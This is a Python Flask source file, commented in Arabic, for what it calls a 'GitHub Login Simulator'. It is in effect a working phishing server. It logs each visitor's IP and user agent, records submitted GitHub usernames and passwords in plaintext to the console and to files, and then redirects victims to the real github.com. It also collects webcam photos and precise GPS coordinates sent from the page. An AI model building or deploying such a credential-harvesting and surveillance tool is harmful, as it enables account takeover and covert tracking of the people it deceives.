from flask import Flask, render_template, request, redirect, jsonify, session
import os
from datetime import datetime
from colorama import init, Fore, Style

# تهيئة الألوان
init()

# تهيئة تطبيق Flask
app = Flask(__name__, 
           template_folder=os.path.join(os.path.dirname(os.path.abspath(__file__)), 'templates'))
app.secret_key = 'github_simulation_key'

# إنشاء المجلدات المطلوبة
DATA_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'data')
UPLOAD_DIR = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'upload')
os.makedirs(DATA_DIR, exist_ok=True)
os.makedirs(UPLOAD_DIR, exist_ok=True)

# متغيرات لتتبع الإحصائيات
visitors_count = 0
login_attempts = 0
photo_count = 0
location_count = 0

def get_real_ip():
    """الحصول على عنوان IP الحقيقي للزائر"""
    # قائمة بكل الهيدرز التي قد تحتوي على IP الحقيقي
    ip_headers = [
        'HTTP_CF_CONNECTING_IP',  # Cloudflare
        'HTTP_X_REAL_IP',        # Nginx
        'HTTP_X_FORWARDED_FOR',  # العام
        'HTTP_X_FORWARDED',      # العام
        'HTTP_X_CLUSTER_CLIENT_IP',
        'HTTP_CLIENT_IP',
        'HTTP_FORWARDED_FOR',
        'HTTP_FORWARDED',
        'REMOTE_ADDR'
    ]
    
    for header in ip_headers:
        if header in request.environ:
            value = request.environ[header]
            # إذا كان الهيدر يحتوي على قائمة من العناوين، نأخذ الأول
            if ',' in value:
                value = value.split(',')[0].strip()
            # تجاهل عناوين IP المحلية
            if not (value.startswith('127.') or value.startswith('192.168.') or value.startswith('10.') or value == 'localhost'):
                return value
                
    # إذا لم نجد أي عنوان IP حقيقي، نرجع عنوان IP المباشر
    return request.remote_addr

@app.route('/')
def index():
    """عرض صفحة تسجيل الدخول"""
    global visitors_count
    visitors_count += 1
    
    # طباعة معلومات الزائر الجديد
    print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] New visitor #{visitors_count}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] IP: {get_real_ip()}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] User-Agent: {request.headers.get('User-Agent', 'Unknown')}{Style.RESET_ALL}")
    print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
    
    return render_template('index.html')

@app.route('/api/capture-photo', methods=['POST'])
def capture_photo():
    """معالجة التقاط الصور من الكاميرا"""
    global photo_count
    
    try:
        if 'photo' not in request.files:
            print(f"{Fore.RED}[!] No photo file in request{Style.RESET_ALL}")
            return jsonify({"status": "error", "message": "No photo file in request"}), 400
            
        photo = request.files['photo']
        if not photo.filename:
            print(f"{Fore.RED}[!] Empty photo filename{Style.RESET_ALL}")
            return jsonify({"status": "error", "message": "Empty photo filename"}), 400
            
        # التأكد من أن المجلد موجود
        os.makedirs(UPLOAD_DIR, exist_ok=True)
        
        # إنشاء اسم الملف
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S_%f')
        filename = f"photo_github_{timestamp}.jpg"
        photo_path = os.path.join(UPLOAD_DIR, filename)
        
        # حفظ الصورة
        print(f"\n{Fore.YELLOW}[*] Saving photo to: {photo_path}{Style.RESET_ALL}")
        photo.save(photo_path)
        
        # التحقق من حفظ الملف
        if not os.path.exists(photo_path):
            print(f"{Fore.RED}[!] Failed to save photo file{Style.RESET_ALL}")
            return jsonify({"status": "error", "message": "Failed to save photo file"}), 500
            
        file_size = os.path.getsize(photo_path)
        if file_size == 0:
            print(f"{Fore.RED}[!] Saved photo file is empty{Style.RESET_ALL}")
            os.remove(photo_path)
            return jsonify({"status": "error", "message": "Photo file is empty"}), 400
        
        photo_count += 1
        
        # طباعة معلومات التقاط الصورة
        print(f"\n{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[📸] PHOTO CAPTURED #{photo_count} - {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Source: GitHub Login Page{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Original filename: {photo.filename}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Saved as: {filename}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] File size: {file_size / 1024:.2f} KB{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] IP: {get_real_ip()}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*60}{Style.RESET_ALL}\n")
        
        return jsonify({
            "status": "success",
            "filename": filename,
            "size": file_size
        })
    
    except Exception as e:
        print(f"{Fore.RED}[!] Error capturing photo: {str(e)}{Style.RESET_ALL}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/save-location', methods=['POST'])
def save_location():
    """حفظ بيانات الموقع"""
    global location_count
    try:
        data = request.json
        if not data:
            return jsonify({"status": "error", "message": "No location data"}), 400
            
        timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
        filename = f'location_{timestamp}.txt'
        filepath = os.path.join(DATA_DIR, filename)
        
        # إنشاء رابط خرائط Google
        maps_url = f"https://www.google.com/maps?q={data.get('latitude')},{data.get('longitude')}"
        
        # حفظ البيانات
        with open(filepath, 'w', encoding='utf-8') as f:
            f.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write(f"IP: {get_real_ip()}\n")
            f.write(f"Latitude: {data.get('latitude')}\n")
            f.write(f"Longitude: {data.get('longitude')}\n")
            f.write(f"Accuracy: {data.get('accuracy')} meters\n")
            f.write(f"Maps URL: {maps_url}\n")
        
        location_count += 1
        
        # طباعة معلومات الموقع
        print(f"\n{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        print(f"{Fore.GREEN}[🌍] Location Captured #{location_count}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Time: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] IP: {get_real_ip()}{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[i] Maps URL: {maps_url}{Style.RESET_ALL}")
        print(f"{Fore.CYAN}{'='*50}{Style.RESET_ALL}")
        
        return jsonify({
            "status": "success",
            "maps_url": maps_url
        })
        
    except Exception as e:
        print(f"{Fore.RED}[!] Location save error: {str(e)}{Style.RESET_ALL}")
        return jsonify({"status": "error", "message": str(e)}), 500

@app.route('/login', methods=['POST'])
def login():
    """معالجة محاولة تسجيل الدخول"""
    global login_attempts
    login_attempts += 1
    
    # جمع البيانات
    username = request.form.get('login', '')
    password = request.form.get('password', '')
    ip_address = get_real_ip()
    user_agent = request.headers.get('User-Agent', 'Unknown')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
    
    # طباعة معلومات محاولة تسجيل الدخول
    print(f"\n{Fore.RED}{'='*50}{Style.RESET_ALL}")
    print(f"{Fore.GREEN}[+] Login Attempt #{login_attempts}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Time: {timestamp}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Username: {username}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] Password: {password}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}[i] IP: {ip_address}{Style.RESET_ALL}")
    print(f"{Fore.RED}{'='*50}{Style.RESET_ALL}")
    
    # حفظ البيانات في ملف
    data = {
        'timestamp': timestamp,
        'username': username,
        'password': password,
        'ip_address': ip_address,
        'user_agent': user_agent
    }
    
    filename = os.path.join(DATA_DIR, f'login_{datetime.now().strftime("%Y%m%d_%H%M%S")}.txt')
    with open(filename, 'w', encoding='utf-8') as f:
        for key, value in data.items():
            f.write(f"{key}: {value}\n")
    
    return redirect('https://github.com')

if __name__ == '__main__':
    try:
        print(f"\n{Fore.GREEN}[✓] Starting GitHub Login Simulator...{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Server running on: http://localhost:5000{Style.RESET_ALL}")
        print(f"{Fore.YELLOW}[*] Press Ctrl+C to stop{Style.RESET_ALL}\n")
        app.run(host='0.0.0.0', port=50005, debug=False)
    except KeyboardInterrupt:
        print(f"\n{Fore.RED}[!] Server stopped by user{Style.RESET_ALL}")
    except Exception as e:
        print(f"\n{Fore.RED}[!] Error: {str(e)}{Style.RESET_ALL}") 